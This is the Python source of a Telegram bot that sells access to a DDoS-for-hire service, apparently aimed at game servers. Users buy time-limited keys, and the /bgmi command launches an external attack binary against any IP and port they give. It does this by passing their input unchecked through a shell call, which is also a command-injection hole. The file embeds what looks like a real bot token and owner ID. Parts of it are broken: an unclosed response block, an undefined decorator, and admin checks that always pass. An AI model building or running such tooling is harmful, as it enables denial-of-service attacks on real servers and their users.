#!usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import random
import string

from keep_alive import keep_alive
keep_alive()


# Insert your Telegram bot token here
bot = telebot.TeleBot('7467600946:AAFRmtRb9_NBeMH1t5XpHR6kCaryzND8PsA')
# Owner and admin user IDs
owner_id = "1127546883"
admin_ids = ["ADMIN_ID1", "ADMIN_ID2"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 900,
    "month": 1800
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['help'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the Network Stress Testing Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month)\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /bgmi <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
        "allusers  : Authorised Users Lists\n"
        "🛑 /clearusers  :- Clear The USERS File\n"
        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_ids else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀𝗬𝗢𝗨𝗥 𝗜𝗣 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗘𝗩𝗘𝗥𝗬 𝟱 𝗦𝗘𝗖.😈"
    
    bot.reply_to(message, response)

    response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫\n🎯𝙄𝙋: {target}\n🏖️𝙋𝙤𝙧𝙩: {port}\n⌚𝙏𝙞𝙢𝙚: {time} 𝙨𝙚𝙘\n👾𝐌𝐞𝐭𝐡𝐨𝐝: ALEX POWERE..... "
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @RaJa_DdOs # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @ALEX_Vvip_DdOs # Check if the user is in admin_ids (admins have no cooldown)
        if user_id not in admin_ids:
            # Join :- @ALex_Vvip_DdOs # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 Second 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                bot.reply_to(message, response)
                return
            # Join :- @RaJa_DdOs # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @freebgmiddos045 # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @freebgmiddos045 # Convert time to integer
            time = int(command[3])  # Join :- @freebgmiddos045 # Convert port to integer
            if time > 240:
                response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @ALex_Vvip_DdOs # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 700"
                subprocess.run(full_command, shell=True)
                response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
        else:
            response = "🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n\n🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /bgmi 20.235.94.237 17870 300"  # Join :- @hydradevil045 # Updated command syntax
    else:
        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @hydradevil045 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED @hydradevil045 OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to HYDRAxDEVIL PREMIUM VIP DDOS 🚀, {user_name}! .\n
🤖Try To Run This Command : /help 
✅Developer : @hydradevil045'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

@message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the firekaran Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /bgmi <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
        "🚨 /allusers  : Authorised Users Lists\n"
        "🛑 /clearusers  :- Clear The USERS File\n"
        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
        "Please use these commands responsibly. 😊"


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

